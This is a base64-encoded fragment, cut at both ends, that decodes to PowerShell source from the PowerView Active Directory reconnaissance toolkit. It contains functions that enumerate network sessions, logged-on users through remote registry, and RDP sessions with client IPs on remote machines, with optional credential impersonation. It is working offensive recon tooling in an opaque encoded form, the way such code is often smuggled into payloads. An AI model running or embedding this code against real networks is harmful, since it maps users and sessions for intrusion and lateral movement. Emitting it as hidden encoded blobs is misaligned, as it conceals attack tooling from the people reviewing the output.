wMTQvMDkvMjUvZWFzaWx5LWRlZmluaW5nLWVudW1zLXN0cnVjdHMtYW5kLXdpbjMyLWZ1bmN0aW9ucy1pbi1tZW1vcnkvCiM+CgogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIGFyZ3VtZW50cyBmb3IgTmV0U2Vzc2lvbkVudW0KICAgICAgICAgICAgJFF1ZXJ5TGV2ZWwgPSAxMAogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICRFbnRyaWVzUmVhZCA9IDAKICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgJFJlc3VtZUhhbmRsZSA9IDAKCiAgICAgICAgICAgICMgZ2V0IHNlc3Npb24gaW5mb3JtYXRpb24KICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6TmV0U2Vzc2lvbkVudW0oJENvbXB1dGVyLCAnJywgJFVzZXJOYW1lLCAkUXVlcnlMZXZlbCwgW3JlZl0kUHRySW5mbywgLTEsIFtyZWZdJEVudHJpZXNSZWFkLCBbcmVmXSRUb3RhbFJlYWQsIFtyZWZdJFJlc3VtZUhhbmRsZSkKCiAgICAgICAgICAgICMgbG9jYXRlIHRoZSBvZmZzZXQgb2YgdGhlIGluaXRpYWwgaW50UHRyCiAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKCiAgICAgICAgICAgICMgMCA9IHN1Y2Nlc3MKICAgICAgICAgICAgaWYgKCgkUmVzdWx0IC1lcSAwKSAtYW5kICgkT2Zmc2V0IC1ndCAwKSkgewoKICAgICAgICAgICAgICAgICMgd29yayBvdXQgaG93IG11Y2ggdG8gaW5jcmVtZW50IHRoZSBwb2ludGVyIGJ5IGZpbmRpbmcgb3V0IHRoZSBzaXplIG9mIHRoZSBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkU0VTU0lPTl9JTkZPXzEwOjpHZXRTaXplKCkKCiAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAjIGNyZWF0ZSBhIG5ldyBpbnQgcHRyIGF0IHRoZSBnaXZlbiBvZmZzZXQgYW5kIGNhc3QgdGhlIHBvaW50ZXIgYXMgb3VyIHJlc3VsdCBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJFNFU1NJT05fSU5GT18xMAoKICAgICAgICAgICAgICAgICAgICAjIHJldHVybiBhbGwgdGhlIHNlY3Rpb25zIG9mIHRoZSBzdHJ1Y3R1cmUgLSBoYXZlIHRvIGRvIGl0IHRoaXMgd2F5IGZvciBWMgogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uID0gJEluZm8gfCBTZWxlY3QtT2JqZWN0ICoKICAgICAgICAgICAgICAgICAgICAkU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICRTZXNzaW9uLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5TZXNzaW9uSW5mbycpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CiAgICAgICAgICAgICAgICAgICAgJFNlc3Npb24KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGZyZWUgdXAgdGhlIHJlc3VsdCBidWZmZXIKICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtUmVnTG9nZ2VkT24gewo8IwouU1lOT1BTSVMKClJldHVybnMgd2hvIGlzIGxvZ2dlZCBvbnRvIHRoZSBsb2NhbCAob3IgYSByZW1vdGUpIG1hY2hpbmUKdGhyb3VnaCBlbnVtZXJhdGlvbiBvZiByZW1vdGUgcmVnaXN0cnkga2V5cy4KCk5vdGU6IFRoaXMgZnVuY3Rpb24gcmVxdWlyZXMgb25seSBkb21haW4gdXNlciByaWdodHMgb24gdGhlCm1hY2hpbmUgeW91J3JlIGVudW1lcmF0aW5nLCBidXQgcmVtb3RlIHJlZ2lzdHJ5IG11c3QgYmUgZW5hYmxlZC4KCkF1dGhvcjogTWF0dCBLZWxseSAoQEJyZWFrZXJzQWxsKSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmLCBDb252ZXJ0RnJvbS1TSUQgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgcXVlcnkgdGhlIEhLVSByZWdpc3RyeSB2YWx1ZXMgdG8gcmV0cmlldmUgdGhlIGxvY2FsCmxvZ2dlZCBvbiB1c2VycyBTSUQgYW5kIHRoZW4gYXR0ZW1wdCBhbmQgcmV2ZXJzZSBpdC4KQWRhcHRlZCB0ZWNobmlxdWUgZnJvbSBTeXNpbnRlcm5hbCdzIFBTTG9nZ2VkT24gc2NyaXB0LiBCZW5lZml0IG92ZXIKdXNpbmcgdGhlIE5ldFdrc3RhVXNlckVudW0gQVBJIChHZXQtTmV0TG9nZ2Vkb24pIG9mIGxlc3MgdXNlciBwcml2aWxlZ2VzCnJlcXVpcmVkIChOZXRXa3N0YVVzZXJFbnVtIHJlcXVpcmVzIHJlbW90ZSBhZG1pbiBhY2Nlc3MpLgoKLlBBUkFNRVRFUiBDb21wdXRlck5hbWUKClNwZWNpZmllcyB0aGUgaG9zdG5hbWUgdG8gcXVlcnkgZm9yIHJlbW90ZSByZWdpc3RyeSB2YWx1ZXMgKGFsc28gYWNjZXB0cyBJUCBhZGRyZXNzZXMpLgpEZWZhdWx0cyB0byAnbG9jYWxob3N0Jy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgcmVtb3RlIHN5c3RlbSB1c2luZyBJbnZva2UtVXNlckltcGVyc29uYXRpb24uCgouRVhBTVBMRQoKR2V0LVJlZ0xvZ2dlZE9uCgpSZXR1cm5zIHVzZXJzIGFjdGl2ZWx5IGxvZ2dlZCBvbnRvIHRoZSBsb2NhbCBob3N0LgoKLkVYQU1QTEUKCkdldC1SZWdMb2dnZWRPbiAtQ29tcHV0ZXJOYW1lIHNxbHNlcnZlcgoKUmV0dXJucyB1c2VycyBhY3RpdmVseSBsb2dnZWQgb250byB0aGUgJ3NxbHNlcnZlcicgaG9zdC4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29udHJvbGxlciB8IEdldC1SZWdMb2dnZWRPbgoKUmV0dXJucyB1c2VycyBhY3RpdmVseSBsb2dnZWQgb24gYWxsIGRvbWFpbiBjb250cm9sbGVycy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtUmVnTG9nZ2VkT24gLUNvbXB1dGVyTmFtZSBzcWxzZXJ2ZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuUmVnTG9nZ2VkT25Vc2VyCgpBIFBTQ3VzdG9tT2JqZWN0IGluY2x1ZGluZyB0aGUgVXNlckRvbWFpbi9Vc2VyTmFtZS9Vc2VyU0lEIG9mIGVhY2gKYWN0aXZlbHkgbG9nZ2VkIG9uIHVzZXIsIHdpdGggdGhlIENvbXB1dGVyTmFtZSBhZGRlZC4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5SZWdMb2dnZWRPblVzZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAjIHJldHJpZXZlIEhLVSByZW1vdGUgcmVnaXN0cnkgdmFsdWVzCiAgICAgICAgICAgICAgICAkUmVnID0gW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUtleV06Ok9wZW5SZW1vdGVCYXNlS2V5KCdVc2VycycsICIkQ29tcHV0ZXJOYW1lIikKCiAgICAgICAgICAgICAgICAjIHNvcnQgb3V0IGJvZ3VzIHNpZCdzIGxpa2UgX2NsYXNzCiAgICAgICAgICAgICAgICAkUmVnLkdldFN1YktleU5hbWVzKCkgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ1MtMS01LTIxLVswLTldKy1bMC05XSstWzAtOV0rLVswLTldKyQnIH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTSUQgJF8gLU91dHB1dFR5cGUgJ0RvbWFpblNpbXBsZScKCiAgICAgICAgICAgICAgICAgICAgaWYgKCRVc2VyTmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUsICRVc2VyRG9tYWluID0gJFVzZXJOYW1lLlNwbGl0KCdAJykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZSA9ICRfCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICIkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRfCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTG9nZ2VkT25Vc2VyJykKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1SZWdMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJyRDb21wdXRlck5hbWUnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICBpZiAoJExvZ29uVG9rZW4pIHsKICAgICAgICAgICAgSW52b2tlLVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtTmV0UkRQU2Vzc2lvbiB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyByZW1vdGUgZGVza3RvcC9zZXNzaW9uIGluZm9ybWF0aW9uIGZvciB0aGUgbG9jYWwgKG9yIGEgcmVtb3RlKSBtYWNoaW5lLgoKTm90ZTogb25seSBtZW1iZXJzIG9mIHRoZSBBZG1pbmlzdHJhdG9ycyBvciBBY2NvdW50IE9wZXJhdG9ycyBsb2NhbCBncm91cApjYW4gc3VjY2Vzc2Z1bGx5IGV4ZWN1dGUgdGhpcyBmdW5jdGlvbmFsaXR5IG9uIGEgcmVtb3RlIHRhcmdldC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogUFNSZWZsZWN0LCBJbnZva2UtVXNlckltcGVyc29uYXRpb24sIEludm9rZS1SZXZlcnRUb1NlbGYgIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSB0aGUgV1RTRW51bWVyYXRlU2Vzc2lvbnNFeCBhbmQgV1RTUXVlcnlTZXNzaW9uSW5mb3JtYXRpb24KV2luMzJBUEkgY2FsbHMgdG8gcXVlcnkgYSBnaXZlbiBSRFAgcmVtb3RlIHNlcnZpY2UgZm9yIGFjdGl2ZSBzZXNzaW9ucyBhbmQgb3JpZ2luYXRpbmcKSVBzLiBUaGlzIGlzIGEgcmVwbGFjZW1lbnQgZm9yIHF3aW5zdGEuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIHRoZSBob3N0bmFtZSB0byBxdWVyeSBmb3IgYWN0aXZlIHNlc3Npb25zIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0gdXNpbmcgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLgoKLkVYQU1QTEUKCkdldC1OZXRSRFBTZXNzaW9uCgpSZXR1cm5zIGFjdGl2ZSBSRFAvdGVybWluYWwgc2Vzc2lvbnMgb24gdGhlIGxvY2FsIGhvc3QuCgouRVhBTVBMRQoKR2V0LU5ldFJEUFNlc3Npb24gLUNvbXB1dGVyTmFtZSAic3Fsc2VydmVyIgoKUmV0dXJucyBhY3RpdmUgUkRQL3Rlcm1pbmFsIHNlc3Npb25zIG9uIHRoZSAnc3Fsc2VydmVyJyBob3N0LgoKLkVYQU1QTEUKCkdldC1Eb21haW5Db250cm9sbGVyIHwgR2V0LU5ldFJEUFNlc3Npb24KClJldHVybnMgYWN0aXZlIFJEUC90ZXJtaW5hbCBzZXNzaW9ucyBvbiBhbGwgZG9tYWluIGNvbnRyb2xsZXJzLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1OZXRSRFBTZXNzaW9uIC1Db21wdXRlck5hbWUgc3Fsc2VydmVyIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvCgpBIFBTQ3VzdG9tT2JqZWN0IHJlcHJlc2VudGluZyBhIGNvbWJpbmVkIFdUU19TRVNTSU9OX0lORk9fMSBhbmQgV1RTX0NMSUVOVF9BRERSRVNTIHN0cnVjdHVyZSwKd2l0aCB0aGUgQ29tcHV0ZXJOYW1lIGFkZGVkLgoKLkxJTksKCmh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvYWEzODM4NjEodj12cy44NSkuYXNweAojPgoKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUkRQU2Vzc2lvbkluZm8nKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKCiAgICAgICAgICAgICMgb3BlbiB1cCBhIGhhbmRsZSB0byB0aGUgUmVtb3RlIERlc2t0b3AgU2Vzc2lvbiBob3N0CiAgICAgICAgICAgICRIYW5kbGUgPSAkV3RzYXBpMzI6OldUU09wZW5TZXJ2ZXJFeCgkQ29tcHV0ZXIpCgogICAgICAgICAgICAjIGlmIHdlIGdldCBhIG5vbi16ZXJvIGhhbmRsZSBiYWNrLCBldmVyeXRoaW5nIHdhcyBzdWNjZXNzZnVsCiAgICAgICAgICAgIGlmICgkSGFuZGxlIC1uZSAwKSB7CgogICAgICAgICAgICAgICAgIyBhcmd1bWVudHMgZm9yIFdUU0VudW1lcmF0ZVNlc3Npb25zRXgKICAgICAgICAgICAgICAgICRwcFNlc3Npb25JbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgICAgICRwQ291bnQgPSAwCgogICAgICAgICAgICAgICAgIyBnZXQgaW5mb3JtYXRpb24gb24gYWxsIGN1cnJlbnQgc2Vzc2lvbnMKICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkV3RzYXBpMzI6OldUU0VudW1lcmF0ZVNlc3Npb25zRXgoJEhhbmRsZSwgW3JlZl0xLCAwLCBbcmVmXSRwcFNlc3Npb25JbmZvLCBbcmVmXSRwQ291bnQpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICAgICAjIGxvY2F0ZSB0aGUgb2Zmc2V0IG9mIHRoZSBpbml0aWFsIGludFB0cgogICAgICAgICAgICAgICAgJE9mZnNldCA9ICRwcFNlc3Npb25JbmZvLlRvSW50NjQoKQoKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtbmUgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKCiAgICAgICAgICAgICAgICAgICAgIyB3b3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkV1RTX1NFU1NJT05fSU5GT18xOjpHZXRTaXplKCkKCiAgICAgICAgICAgICAgICAgICAgIyBwYXJzZSBhbGwgdGhlIHJlc3VsdCBzdHJ1Y3R1cmVzCiAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJHBDb3VudCk7ICRpKyspIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICMgY3JlYXRlIGEgbmV3IGludCBwdHIgYXQgdGhlIGdpdmVuIG9mZnNldCBhbmQgY2FzdCB0aGUgcG9pbnRlciBhcyBvdXIgcmVzdWx0IHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAkSW5mbyA9ICROZXdJbnRQdHIgLWFzICRXVFNfU0VTU0lPTl9JTkZPXzEKCiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uID0gTmV3LU9iamVjdCBQU09iamVjdAoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRJbmZvLnBIb3N0TmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkSW5mby5wSG9zdE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgbm8gaG9zdG5hbWUgcmV0dXJuZWQsIHVzZSB0aGUgc3BlY2lmaWVkIGhvc3RuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uTmFtZScgJEluZm8ucFNlc3Npb25OYW1lCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJCgtbm90ICRJbmZvLnBEb21haW5OYW1lKSAtb3IgKCRJbmZvLnBEb21haW5OYW1lIC1lcSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSBkb21haW4gaXNuJ3QgcmV0dXJuZWQganVzdCB1c2UgdGhlIHVzZXJuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgIiQoJEluZm8ucFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAiJCgkSW5mby5wRG9tYWluTmFtZSlcJCgkSW5mby5wVXNlck5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJRCcgJEluZm8uU2Vzc2lvbklECiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1N0YXRlJyAkSW5mby5TdGF0ZQoKICAgICAgICAgICAgICAgICAgICAgICAgJHBwQnVmZmVyID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgICAgICAgICAgICAgJHBCeXRlc1JldHVybmVkID0gMAoKICAgICAgICAgICAgICAgICAgICAgICAgIyBxdWVyeSBmb3IgdGhlIHNvdXJjZSBjbGllbnQgSVAgd2l0aCBXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAjICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9hYTM4Mzg2MSh2PXZzLjg1KS5hc3B4CiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQyID0gJFd0c2FwaTMyOjpXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbigkSGFuZGxlLCAkSW5mby5TZXNzaW9uSUQsIDE0LCBbcmVmXSRwcEJ1ZmZlciwgW3JlZl0kcEJ5dGVzUmV0dXJuZWQpOyRMYXN0RXJyb3IyID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdDIgLWVxIDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtTmV0UkRQU2V